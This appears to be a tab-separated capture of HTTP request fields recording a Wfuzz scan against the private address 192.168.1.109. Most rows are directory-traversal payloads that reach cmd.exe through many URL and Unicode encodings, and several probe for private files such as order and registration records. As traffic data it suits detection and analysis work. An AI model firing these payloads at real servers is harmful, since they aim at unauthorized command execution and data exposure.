http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									5266,5266,5266,5266,5266,5266,5266,5266,5266						1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/Rpc/check.bat/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/SQLQHit.asp/,http://192.168.1.109/web/SiteServer/Knowledge/Default.asp?ctr=\/,http://192.168.1.109/web/T-admin.cgi/,http://192.168.1.109/web/USER/CONFIG.AP/,http://192.168.1.109/web/WebShop/templates/cc.txt/,http://192.168.1.109/web/_AuthChangeUrl/,http://192.168.1.109/web/_mem_bin/..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_private/register.htm/,http://192.168.1.109/web/_mem_bin/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/Rpc/check.bat/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,/web/SQLQHit.asp/,/web/SiteServer/Knowledge/Default.asp?ctr=\/,/web/T-admin.cgi/,/web/USER/CONFIG.AP/,/web/WebShop/templates/cc.txt/,/web/_AuthChangeUrl/,/web/_mem_bin/..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,/web/_private/register.htm/,/web/_mem_bin/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									5394						1,1	http://192.168.1.109/web/_mem_bin/remind.asp/,http://192.168.1.109/web/_vti_bin/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/remind.asp/,/web/_vti_bin/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir+c:\/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir+c:\/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%%35%63../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%%35%63../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+dir+c:\/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+dir+c:\/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									5558,5558,5558						1,1,1,1	http://192.168.1.109/web/_mem_bin/FormsLogin.asp/,http://192.168.1.109/web/_private//,http://192.168.1.109/web/_vti_bin//,http://192.168.1.109/web/_vti_bin/..%%35c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/FormsLogin.asp/,/web/_private//,/web/_vti_bin//,/web/_vti_bin/..%%35c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									5737						1,1	http://192.168.1.109/web/_vti_bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/..%u0025%u005c../..%u0025%u005c../..%u0025%u005c../winnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_vti_bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/..%u0025%u005c../..%u0025%u005c../..%u0025%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u0025%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u0025%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/../../../../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/../../../../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/../../../../winnt/system32/cmd.exe?/c+dir%20c:\/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/../../../../winnt/system32/cmd.exe?/c+dir%20c:\/
*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									6125,6125,6125,6125,6125						1,1,1,1,1,1	http://192.168.1.109/web/_mem_bin/formslogin.asp?\/,http://192.168.1.109/web/_private/,http://192.168.1.109/web/_private/shopping_cart.mdb/,http://192.168.1.109/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/_vti_bin/_vti_aut/author.dll/,http://192.168.1.109/web/_vti_bin/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/formslogin.asp?\/,/web/_private/,/web/_private/shopping_cart.mdb/,/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\/,/web/_vti_bin/_vti_aut/author.dll/,/web/_vti_bin/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									6141,6141,6141,6141,6141						1,1,1,1,1,1	http://192.168.1.109/web/_mem_bin/check.bat/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_pages/,http://192.168.1.109/web/_vti_bin/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir+c:\%20HTTP/1.0"%20&%20vbCrLf%20&%20vbCrLf/,http://192.168.1.109/web/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/_vti_bin/..\..\..\../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/check.bat/..%255c../..%255cwinnt/system32/cmd.exe?/c+dir/,/web/_pages/,/web/_vti_bin/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir+c:\%20HTTP/1.0"%20&%20vbCrLf%20&%20vbCrLf/,/web/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\/,/web/_vti_bin/..\..\..\../winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									6168,6168,6168						1,1,1,1	http://192.168.1.109/web/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/_vti_bin/..%255c../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/.._../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+dir+c:\/,/web/_vti_bin/..%255c../winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/.._../winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_bin/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_bin/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									6255,6255						1,1,1	http://192.168.1.109/web/_vti_bin/..\..\..\../winnt/system32/cmd.exe?/c+dir%20c:\/,http://192.168.1.109/web/_vti_bin/admin.pl/,http://192.168.1.109/web/_vti_bin/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_vti_bin/..\..\..\../winnt/system32/cmd.exe?/c+dir%20c:\/,/web/_vti_bin/admin.pl/,/web/_vti_bin/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									6422						1,1	http://192.168.1.109/web/_vti_bin/fpadmin.htm/,http://192.168.1.109/web/_vti_cnf/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_vti_bin/fpadmin.htm/,/web/_vti_cnf/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									6447,6447,6447,6447,6447,6447,6447						1,1,1,1,1,1,1,1	http://192.168.1.109/web/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_private/form_results.txt/,http://192.168.1.109/web/_private/registrations.txt/,http://192.168.1.109/web/_vti_bin/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/_vti_aut/,http://192.168.1.109/web/_vti_bin/_vti_aut/dvwssr.dll/,http://192.168.1.109/web/_vti_bin/fpcount.exe?Page=default.htm|Image=2|Digits=1/,http://192.168.1.109/web/_vti_cnf/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,/web/_private/form_results.txt/,/web/_private/registrations.txt/,/web/_vti_bin/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/_vti_aut/,/web/_vti_bin/_vti_aut/dvwssr.dll/,/web/_vti_bin/fpcount.exe?Page=default.htm|Image=2|Digits=1/,/web/_vti_cnf/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_cnf/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_cnf/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									6553,6553,6553,6553,6553,6553,6553						1,1,1,1,1,1,1,1	http://192.168.1.109/web/_mem_bin/.._../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_private/orders.txt/,http://192.168.1.109/web/_vti_adm/admin.dll/,http://192.168.1.109/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/CGImail.exe/,http://192.168.1.109/web/_vti_bin/cfgwiz.exe/,http://192.168.1.109/web/_vti_bin/fpexe/,http://192.168.1.109/web/_vti_cnf/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_mem_bin/.._../winnt/system32/cmd.exe?/c+dir/,/web/_private/orders.txt/,/web/_vti_adm/admin.dll/,/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/CGImail.exe/,/web/_vti_bin/cfgwiz.exe/,/web/_vti_bin/fpexe/,/web/_vti_cnf/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_cnf/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_cnf/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									6592,6592						1,1,1	http://192.168.1.109/web/_vti_bin/contents.htm/,http://192.168.1.109/web/_vti_bin/fpsrvadm.exe/,http://192.168.1.109/web/_vti_cnf/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_vti_bin/contents.htm/,/web/_vti_bin/fpsrvadm.exe/,/web/_vti_cnf/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									6625,6625						1,1,1	http://192.168.1.109/web/_vti_bin/check.bat/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/shtml.dll/nosuch.htm/,http://192.168.1.109/web/_vti_cnf/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_vti_bin/check.bat/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/shtml.dll/nosuch.htm/,/web/_vti_cnf/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_cnf/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_cnf/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/_vti_cnf/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/_vti_cnf/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									6670,6670,6670,6670,6670,6670						1,1,1,1,1,1,1	http://192.168.1.109/web/_private/register.txt/,http://192.168.1.109/web/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,http://192.168.1.109/web/_vti_bin/_vti_aut/fp30reg.dll/,http://192.168.1.109/web/_vti_bin/fpcount.exe/,http://192.168.1.109/web/_vti_bin/shtml.exe/_vti_rpc/,http://192.168.1.109/web/_vti_cnf/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/_private/register.txt/,/web/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/..%255c../..%255c../winnt/system32/cmd.exe?/c+dir/,/web/_vti_bin/_vti_aut/fp30reg.dll/,/web/_vti_bin/fpcount.exe/,/web/_vti_bin/shtml.exe/_vti_rpc/,/web/_vti_cnf/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/
